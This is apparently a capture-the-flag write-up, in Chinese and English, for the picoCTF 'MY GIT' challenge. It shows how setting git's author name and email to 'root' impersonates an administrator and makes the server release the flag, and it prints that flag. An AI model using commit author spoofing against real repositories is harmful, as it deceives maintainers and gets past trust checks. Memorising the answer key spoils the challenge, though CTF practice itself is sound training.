# MY GIT

## 題目描述 (Description)

I have built my own Git server with my own rules!

### 提示 (Hints)

1. Hint 1  
    How do you specify your Git username and email?

## 解題思路 (Solution Walkthrough)

1. **第一步**：先使用 `git clone ssh://git@foggy-cliff.picoctf.net:59430/git/challenge.git` 來 clone repo 到本地

2. **第二步**：看了 `README.md` 以後發現要使用管理員帳號才能得到 flag，於是使用以下指令更改名稱以及 email

    ```text
    git config user.name "root"
    git config user.email "root@picoctf"
    ```

3. **第三步**：push 一個假的 flag.txt，即可取得 flag

    ```text
    ❯ git push origin master
    git@foggy-cliff.picoctf.net's password: 
    Enumerating objects: 4, done.
    Counting objects: 100% (4/4), done.
    Delta compression using up to 12 threads
    Compressing objects: 100% (2/2), done.
    Writing objects: 100% (3/3), 255 bytes | 63.00 KiB/s, done.
    Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
    remote: Author matched and flag.txt found in commit...
    remote: Congratulations! You have successfully impersonated the root user
    remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_f3a6488d}
    To ssh://foggy-cliff.picoctf.net:59430/git/challenge.git
        4142dd3..6e6f6a4  master -> master
    ```

## Flag

```text
picoCTF{1mp3rs0n4t4_g17_345y_f3a6488d}
```
